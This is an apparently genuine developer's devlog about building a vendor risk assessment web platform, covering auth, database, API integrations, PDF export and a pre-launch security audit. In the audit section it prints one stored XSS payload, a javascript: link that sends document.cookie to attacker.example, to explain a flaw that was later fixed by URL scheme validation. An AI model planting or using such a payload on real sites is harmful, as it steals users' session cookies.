# Fides — Engineering Devlog

A first-person account of building a multi-tenant vendor risk assessment platform from scratch. One developer, eight phases, roughly six weeks. This is the record I wish I'd had before starting.

---

## Phase 1–3 · Foundation, Database, Deployment

**Goal:** Get a working skeleton deployed — Auth0 login, Neon Postgres with the full schema, protected dashboard showing the right user claims.

### The Auth0 version decision

Auth0's Next.js SDK has two generations with completely different APIs. The `@auth0/nextjs-auth0` v1/v2 family was built for the Pages Router. v3 was rewritten specifically for App Router, with server components, `getSession()` in route handlers, and middleware integration that actually works with the edge runtime. Using the wrong version means fighting the framework at every turn — session reads that silently return null, middleware that can't wrap async functions, cookie handling that breaks on Vercel's edge network.

The decision to pin to v3 from day one was in the brief, but worth spelling out why: it's not just a version bump, it's a different mental model. You're writing server components that call `getSession()` directly, not wrapping everything in HOCs or context providers. Once that clicks, the rest of the auth layer falls into place.

### The Next.js version downgrade

When scaffolding with `create-next-app`, the default pulls the latest release. At the time I started, that pulled Next.js 16 — which had breaking changes in the App Router around route handler streaming and some edge runtime behaviour that conflicted with how `@auth0/nextjs-auth0 v3` reads cookies in middleware. Specifically, the `withMiddlewareAuthRequired` wrapper wasn't producing a 200 response object in the same shape the middleware logic expected, causing every authenticated route to bounce.

Downgraded to 15, which the Auth0 SDK explicitly supports, and everything worked. Not a fun hour. The lesson is that "latest" and "compatible" aren't the same thing, especially when you're combining two frameworks that both have opinions about the request/response cycle at the edge.

### Neon's two connection strings

Neon gives you two PostgreSQL connection strings and it matters enormously which one you use where. The pooled connection goes through PgBouncer — it handles connection management for you, which is essential in a serverless environment where every function invocation would otherwise open a fresh Postgres connection and exhaust the limit within minutes under any real load. The direct/unpooled connection is a raw TCP connection to the primary — necessary for running migrations because `drizzle-kit` uses `BEGIN`/`COMMIT` transactions that PgBouncer's transaction pooling mode can't handle correctly.

The rule I settled on and never deviated from: `DATABASE_URL` (pooled) in the Drizzle app client for everything the app touches, `DATABASE_URL_DIRECT` (unpooled) only in `drizzle.config.ts` for migration runs. They're different env vars, different code paths, never swapped.

### The gmail-com org_id problem

The initial Auth0 Action derived `org_id` from the user's email domain: `jane@acmecorp.com` got `org_id: acmecorp-com`. Functional enough to build the skeleton, but the first deployment revealed the problem immediately: my own login produced `org_id: gmail-com`. Every API call was filtering database records by an org that didn't exist, returning empty results for everything.

The fix was already planned for Phase 4 — move `org_id` to a database lookup. But it was a useful early reminder that deriving identity from email domain is fragile and that the JWT claim needs to be authoritative from a real record, not inferred from an address.

---

## Phase 4 · Auth & Organisation

**Goal:** Replace the email-domain hack with a proper organisation model — onboarding flow, invite tokens, role system, logo uploads.

### Solo vs Organisation: a deliberate split

The initial instinct was to have one account type and treat single-person accounts as organisations of one. I went against that for a few reasons. Solo users don't need invite flows, member limits, or the settings page sections that govern teams. Surfacing those things to someone who signed up to use this alone creates noise and implies complexity they didn't ask for.

So `account_type: SOLO | ORGANISATION` became a first-class enum, and the entire onboarding UI branches on it. SOLO users see "My Workspace" in the header, no member count, no invite section in settings. ORGANISATION accounts see all of it. The database schema supports both from the same tables — it's a UI and logic distinction, not a schema one.

### The invite token system

The invite flow needed to handle an edge case from the start: what happens when someone joins an org that's at its free-tier member limit? Silently failing would be confusing. Hard-blocking would be frustrating. The design I landed on: always let the invite through, but create the user with `status: PENDING_UPGRADE` rather than a full active account. They can log in and see the dashboard, but with a persistent banner explaining their account is pending activation. The admin sees a notification to upgrade.

This matters because the alternative — refusing the join and leaving someone stuck on an error page with an invite link that was shared in good faith — creates a terrible first impression. The soft-pending approach is more honest and recoverable.

Tokens are 64-character random strings with a 7-day expiry, stored with a unique constraint. One use per token. The lookup is by token value only — there's no route that accepts an org identifier separately, so there's no way to fish for valid tokens by brute-forcing org IDs.

### Moving org_id into the JWT from the database

The Auth0 Action runs on every login. The updated version issues a database query — using the direct Neon connection string stored as an Auth0 Action secret, never in code — to look up the authenticated user by their Auth0 subject ID. If a record exists, the Action stamps the org's slug, the user's role, and `needs_onboarding: false` into the JWT claims. If no record exists, it stamps `needs_onboarding: true` and nothing else.

Middleware reads `needs_onboarding` on every request. If true and the path isn't `/onboarding`, it redirects. This is the cleanest way I found to handle the "new login, no account yet" state without building a separate session state layer.

One subtlety: the Auth0 secret storage for the Action is not in source code. It's configured through the Auth0 dashboard's Secrets panel. The connection string lives there and only there — no `.env` file, no committed config, nothing in the repo. That distinction is important because the Action runs on Auth0's infrastructure, not on my Vercel deployment.

### Logo uploads and the Vercel Blob store

The brief specified storing org logos in a Vercel Blob store. The implementation used `@vercel/blob`'s `put()` API from the server route handler, returning the blob URL to be saved in `organisations.logo_url`. Straightforward in theory.

The problem that showed up in Phase 7 (covered below) was that the store had been created with private access mode, which means blob URLs aren't directly accessible — requests to them return 403. I didn't discover this until trying to render the logo in the dashboard header and getting a broken image. The fix was a server-side proxy route that fetches the blob using the write token and streams it back to the client. The URL stored in the database never changes; only the serving path changes. More on this in the Phase 7 notes.

---

## Phase 5 · Assessment Pipeline

**Goal:** Build the full data collection and scoring pipeline — Companies House, GLEIF, sanctions, news, trust portals, three Claude calls, scored output stored in the database.

This was the most technically interesting phase and the one with the most things go wrong.

### The GLEIF API disappearing endpoint

The Phase 5 brief specified using GLEIF's `/fuzzycompanyquery` endpoint for name-based entity lookups. I had it working in local testing. Then it stopped working — not an error, just a 404 on every request. GLEIF had quietly retired the endpoint. No deprecation notice in the documentation I could find, no sunset header on responses. It was simply gone.

The replacement is the `/autocompletions?field=fulltext&q=` endpoint, which returns structured suggestion results. The response schema is different — you get `relationships['lei-records'].data.id` to get the LEI from a search result, rather than the full record directly. Added a second step to fetch the full LEI record once identified.

This is the kind of API dependency risk that's hard to design around. The best mitigation is graceful degradation, which was already in place: if GLEIF returns nothing, the OWNERSHIP dimension scores at 40 (unknown jurisdiction) rather than crashing the pipeline.

### The Anthropic API credits problem

After deploying the pipeline, Claude calls were silently failing on production. Locally they worked fine. The error logging showed `APIError status=403` — which the SDK surfaces as a credit balance or permissions issue, not a malformed request. Everything looked correct: model name, API key present, payload valid.

The root cause took a while to find: the API key in the production environment belonged to a different Anthropic account than the one where I had actually purchased credits. The key was syntactically valid and authenticated successfully, but the account it pointed to had a zero balance. Locally I was using a different key from a different account that did have credits.

The fix was straightforward — update the production environment variable to use the key from the account with credits. But the diagnostic path was frustrating because the error message doesn't say "wrong account" or "this account has no credits," it says something closer to "you are not authorised to use this model." Worth knowing that a 403 from the Anthropic API can mean several different things, and billing state is one of them.

### The cache_control bug

I had added prompt caching to the Claude calls — specifically, `cache_control: { type: 'ephemeral' }` on the system prompt — to reduce latency and cost on repeated assessments for the same vendor. The calls were returning 400 errors with `invalid_request_error`.

The issue: Anthropic's prompt caching requires the `anthropic-beta: prompt-caching-2024-07-31` header to be present on the request. The `@anthropic-ai/sdk` doesn't add it automatically when you include `cache_control` in the message payload — you have to opt in explicitly with `defaultHeaders` on the client or `headers` on the individual call. Without the beta header, any message containing `cache_control` is rejected as an invalid request.

The error message is clear once you know what to look for, but I spent time checking the payload structure first before realising it was a missing header. Removed caching from the initial implementation to keep the Claude calls simple and reliable. It's a latency optimisation I'd revisit, not a correctness requirement.

### The GLEIF entity mismatch

Testing the pipeline against Capita PLC — a large UK outsourcing firm, useful as a test case — produced a GLEIF result for a Jersey-registered employee benefit trust, not the main entity. The `/autocompletions` endpoint had matched on the name but returned the first result, which happened to be a subsidiary trust with "Capita" in its name rather than the primary listed entity.

The fix was to change the lookup order: when a Companies House registration number is available, try a GLEIF registry-number lookup first — `/lei-records?filter[entity.registeredAs]=COMPANY_NUMBER&filter[entity.jurisdiction]=GB` — before falling back to name search. A registration number match is unambiguous; a name match is not. The name-based autocomplete is now the fallback, not the primary approach. This eliminated the mismatch entirely.

### Pipeline structure: the five phases

The pipeline ended up structured as five sequential stages within a single server-sent events stream:

- **Phase A** — parallel data collection: Companies House (profile, officers, PSC, filings), GLEIF, sanctions screening, NewsAPI, trust portals, HIBP (feature-flagged off)
- **Phase B** — sequential Claude calls that depend on Phase A data: going concern analysis on filing text, news sentiment analysis on headlines
- **Phase C** — score calculation across all six dimensions, weighted sum, tier determination, special override rules
- **Phase D** — Claude executive summary, takes the full scored result as input
- **Phase E** — single Drizzle transaction: assessment record, six score rows, certification rows, audit log entry, reassessment schedule

The entire Phase E write is transactional — if anything fails, nothing is written. I wanted to avoid a state where the assessment record exists but some scores don't, which would cause confusing UI states.

---

## Phase 6 · Scoring Engine UI & DORA Classification

**Goal:** Manual score overrides with audit trail, DORA/FCA classification form, score recalculation.

### The neutral news score change

The original pipeline set a "neutral" news sentiment score at 70 — a vendor with no relevant headlines, no risk items identified, just general news that didn't ping anything. I changed this to 80 in Phase 6.

The reasoning: 70 implies something slightly concerning. A vendor with completely clean news coverage and no risk signals identified shouldn't be pulled toward the midpoint. 80 is a better expression of "we checked, nothing alarming." It's a small number with a meaningful interpretation change, and it shifted a few vendors from MEDIUM to LOW in test data where news was the only weak dimension.

### JSON parse hardening on Claude responses

The three Claude calls all expect JSON-only responses. In practice, the model occasionally wraps the JSON in a markdown code fence (` ```json ... ``` `) or adds a brief preamble sentence before the opening brace. The first version of the parse logic called `JSON.parse(result)` directly, which would throw on any such output and mark the dimension as `summary_unavailable`.

The fix was a small `extractJson()` helper that scans for the first `{` and last `}` in the response string and extracts the substring between them before parsing. This handles code fences, preamble text, and trailing commentary without needing to prompt-engineer the model into perfect compliance. Robust parsing beats fragile prompting here.

---

## Phase 7 · Design System & Report UI

**Goal:** Apply a consistent design system across the entire app, build the full report page, add the Fides seal component.

### Why purple

Most compliance tools default to blue — it reads as professional, trusted, institutional. I went with purple (`#5B3FD4`) for a specific reason: the product is AI-assisted, and purple has enough distinctiveness to signal that without needing to say it. It's also not the colour of any of the major compliance frameworks' brand guidelines, which means it doesn't look like a Vanta reskin or a GRC module bolted onto something else. The risk tier colours — blue/green/amber/red — stay conventionally meaningful; the purple only appears as the product accent.

### The Fides seal

I wanted a visual identity mark for the product, something that could appear on PDFs and reports as a kind of authenticity stamp. The design reference was a wax seal or coin — concentric rings, an initial, text around the inner ring. The SVG version (`FidesSeal.tsx`) uses `textPath` to curve "VENDOR ASSESSMENT" along the upper arc and "RISK MANAGEMENT" along the lower arc. `React.useId()` generates unique path IDs so the component can be used multiple times on the same page without ID collisions.

This works perfectly in the browser. The problem emerged in Phase 8 when I added PDF export.

### The Vercel Blob private store problem

The Blob store was created during Phase 4 with private access mode enabled — it seemed like the safer default at the time. Private stores require authentication for every read, which is fine for uploads but means any `<img src={blobUrl}>` in the browser gets a 403 because the browser request doesn't carry the write token.

The important detail is that Vercel Blob store access mode cannot be changed after creation. It's set at creation time and that's it. So I couldn't just flip a setting.

The solution: a server-side proxy route (`/api/org/logo`) that accepts the org ID, looks up the logo URL, fetches the blob using the server-side `BLOB_READ_WRITE_TOKEN`, and streams the response back to the client with the appropriate `Content-Type`. The browser hits the proxy route, not the blob URL directly. Logo uploads still go directly to Blob, but reads go through the proxy. It adds a small amount of latency and a network hop, but it works correctly and keeps the token server-side.

The lesson: know your storage access model before creating a store. "Private" on Vercel Blob doesn't mean "authenticated users only" — it means "service-to-service only, never from a browser."

---

## Phase 8 · Security Audit, PDF Export & Public Launch

**Goal:** PDF export with `@react-pdf/renderer`, questionnaire generation, cert expiry cron, and a full adversarial security review before going public.

### The adversarial security audit

Before making the repository public, I ran a structured adversarial review — two personas: Ghost (unauthenticated external attacker) and Sentinel (authenticated insider threat). The goal was to find issues that wouldn't show up in normal testing.

Ghost identified the most serious issue.

### The sourceUrl XSS vulnerability

The certification POST endpoint accepted a `sourceUrl` field — an analyst-entered link to the certification document. The value was stored in the database and later rendered in the UI as an `<a href={sourceUrl}>` link. There was no validation on the URL scheme.

A stored XSS payload via `javascript:` scheme: if an analyst (or someone who compromised an analyst's account) submitted `sourceUrl: "javascript:fetch('https://attacker.example/steal?c='+document.cookie)"`, every user who viewed the certification card and clicked the link would execute that code in their session. This is a stored XSS — one write, many victims, persistent.

The fix is a URL scheme validation on ingest: parse the value with the `URL` constructor, check that `.protocol` is `http:` or `https:`, and reject anything else with a 400. The validation happens at the API boundary before the value reaches the database.

The broader principle: any user-supplied string that ends up in an HTML attribute — especially `href` — needs scheme validation, not just length capping. I had the length cap, not the scheme check.

### The rate_limits table that was never enforced

Looking at the schema, there was a `rate_limits` table defined since Phase 2, with `userId`, `date`, `assessmentCount`, and a unique constraint on `(userId, date)`. The schema was correct. The migration had run. The table existed in the database.

Nobody was writing to it.

The `POST /api/assessments` handler — the one that triggers the full pipeline with three Claude calls, Companies House requests, GLEIF lookups, and news fetches — had no rate limiting code. Any authenticated user could run unlimited assessments. The table was a schema artefact from the original brief that never got connected to the application code.

Added during the Phase 8 security pass: check the current day's count before running the pipeline, return 429 if it's at or above the limit (20/day), and upsert the counter with an atomic `assessmentCount + 1` using Drizzle's SQL template. The upsert uses `onConflictDoUpdate` with a raw SQL expression to avoid the read-then-write race condition a naive implementation would have.

### SVG textPath in react-pdf

`@react-pdf/renderer` uses a custom SVG renderer that implements a subset of the SVG spec. `textPath` — which is what the `FidesSeal` component uses to curve text along an arc — is not in that subset. The PDF cover page rendered the two concentric rings correctly but showed no text at all. No error, just silence.

The fix was a PDF-specific seal component that doesn't use `textPath`. Instead: a `View` container with the `Svg` circles in normal flow, then an absolutely-positioned `View` overlay carrying a large `Times-Roman` "F" and tracked-caps "FIDES" text. "VENDOR ASSESSMENT" and "RISK MANAGEMENT" render as regular react-pdf `Text` nodes below the circle container. The browser `FidesSeal.tsx` is unchanged — it still uses `textPath` and works fine in the browser. The PDF version is a parallel implementation that makes different trade-offs for a different rendering context.

The rule I'd apply going forward: any component that needs to work in both browser and PDF contexts should be separated from day one. Trying to share implementation across two very different rendering environments creates constraints that fight each other.

### The cron security pattern

The cert expiry cron route runs on Vercel's infrastructure at 09:00 UTC. It needs to be publicly reachable (Vercel hits it over HTTP), but it must not be callable by anyone else. The protection is a shared secret — an `x-vercel-cron-secret` header that Vercel sends and the route validates against `process.env.CRON_SECRET`. If the header is missing or wrong, the route returns 401 immediately.

This is the standard Vercel pattern, but worth noting: the CRON_SECRET needs to be generated and added to both Vercel environment variables and `.env.local`. It's not auto-provisioned. A cron route without this check is a free trigger endpoint for anyone who discovers the path.

---

## What I'd Do Differently

**Use a type-safe API layer from the start.** Every API route manually validates request bodies with `typeof body.field === 'string'` checks. It works, but it's verbose and easy to miss a field. tRPC or a Zod schema layer at the route boundary would have caught several of the input validation gaps that showed up in the security audit automatically, and removed a lot of repetitive validation code.

**Test against the real GLEIF API earlier.** I relied on documentation that turned out to be outdated. Ten minutes of exploratory HTTP requests against the live API before writing any integration code would have caught the deprecated endpoint before it was baked into the pipeline design.

**Create the Blob store with the right access mode.** Private vs public is a one-way door on Vercel Blob. The proxy workaround is functional but adds complexity and latency that could have been avoided. Think through the full read path before choosing a storage access model.

**Wire up the rate limiting table at the same time as the schema.** The `rate_limits` table sat in the schema for six phases, fully defined, doing nothing, because the application code that was supposed to use it wasn't written. A schema without enforcement is worse than no schema because it creates a false sense of coverage. Either write the enforcement code when you write the schema, or don't create the table until you're ready to use it.

**Separate browser components from PDF components earlier.** The FidesSeal situation — browser SVG with textPath that doesn't work in react-pdf — was predictable in hindsight. Any component that appears on both the web UI and in PDFs should have the PDF variant defined from the start, not refactored in when the limitation surfaces.

**Add the API key account/billing check to initial setup.** The Anthropic API key mismatch (key from account A, credits on account B) took time to diagnose because the error surface looked like a permissions problem. A simple startup check that makes one minimal API call and logs the result would have surfaced this immediately instead of after deployment.

---

*Built with Claude Code and the Anthropic API. Data: Companies House · GLEIF · OFSI/OFAC/EU sanctions · NCSC · NewsAPI.*
